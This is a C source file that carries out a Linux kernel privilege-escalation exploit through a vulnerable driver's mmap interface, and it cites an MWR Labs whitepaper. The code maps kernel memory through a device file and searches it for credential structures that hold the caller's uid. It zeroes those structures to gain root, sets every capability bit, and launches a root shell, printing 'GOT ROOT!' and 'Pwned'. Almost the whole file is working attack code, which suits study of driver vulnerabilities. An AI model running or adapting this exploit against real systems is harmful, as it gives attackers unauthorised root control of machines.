/*
 * mmap_userspc.c
 * Ref: https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-mmap-exploitation-whitepaper-2017-09-18.pdf
 */
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <limits.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <signal.h>
#include <stdlib.h>
#include <errno.h>

void sig(int signum)
{
	fprintf (stderr,"In sig: signum=%d\n", signum);
}

int main(int argc, char **argv)
{
	int fd;
	off_t offset=0x0;
	struct sigaction act;
	unsigned long len=0;
	unsigned int *mmap_start=0, *addr=0;
	unsigned long startaddr=0x0;
	
	if( argc!=3 ) {
		fprintf(stderr,"Usage: %s device_file num_bytes_to_read\n", argv[0]);
		exit(1);
	}

	printf("UID=%d EUID=%d\n", getuid(), geteuid());
	act.sa_handler = sig;
	act.sa_flags = SA_RESTART;
	sigemptyset (&act.sa_mask);
	if ((sigaction (SIGINT, &act, 0)) == -1) {
		perror("sigaction"), exit (1);
	}	

	if( (fd=open(argv[1],O_RDWR,0)) == -1)
		perror("open"),exit(1);
	printf("PID %d: device opened: fd=%d\n", getpid(), fd);

	len = strtoul(argv[2], 0, 0);
#if 0
	if ((num < 0) || (num > INT_MAX)) {
		fprintf(stderr,"%s: number of bytes '%ld' invalid.\n", argv[0], num);
		close (fd);
		exit (1);
	}
#endif
	/*
	 void *mmap(void *addr, size_t length, int prot, int flags,
                  int fd, off_t offset);
	*/
	mmap_start = addr = (unsigned int *)mmap((void *)startaddr, len, PROT_READ|PROT_WRITE,
			MAP_SHARED, fd, offset);
	if (mmap_start == MAP_FAILED) {
        	printf("errno = %d\n", errno); /* 13! that's EACCES, not ENOMEM ! */
		perror("mmap failed (see dmesg output as well)");
		close(fd);
		return -1;
	}
	printf("%s: mmap addr = %p\n", argv[0], mmap_start);


	// PDF, pg 18
	unsigned int uid = getuid();
	unsigned int credIt = 0;
	unsigned int credNum = 0;

	printf("[+] UID: %d\n", uid);
	unsigned long bas = (unsigned int)mmap_start + len - 0x40;
	printf("  addr=%p mmap_start=%p len=%lu\n"
	       "  bas = %p\n",
		addr, mmap_start, len, (void *)bas);

	int i=0;
	while (((unsigned long)addr) < bas) {
		credIt = 0;
		if (
				addr[credIt++] == uid &&
				addr[credIt++] == uid &&
				addr[credIt++] == uid &&
				addr[credIt++] == uid &&
				addr[credIt++] == uid &&
				addr[credIt++] == uid &&
				addr[credIt++] == uid &&
				addr[credIt++] == uid
		   ) {
			credNum++;
			printf("[.] Found cred structure! ptr: %p, credNum: %d\n", addr, credNum);

			credIt = 0;
			addr[credIt++] = 0; // set all cred struct members to 0 !
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;

			if (getuid() == 0) {
				puts("[+] GOT ROOT!");

				// Make all capability sets all 1's
				credIt += 1; //Skip 4 bytes, to get capabilities
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				puts("[+]  All capabilities set to 1; exec sh; Pwned :-D");

				execl("/bin/sh", "sh", (char *)0);
				puts("[-] execl /bin/sh failed");
				break;
			} else {
				credIt = 0;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
			}
		}
		addr++;
		/*if ((i%100)==0)
			printf("  loop #%lu addr=%p\n", i, addr); */
		i ++;
	} // while()
	printf("[-] Scanning loop END (i=%d)\n", i);

	//pause();
	munmap(addr, len);
   	close(fd);
	exit(0);       
}
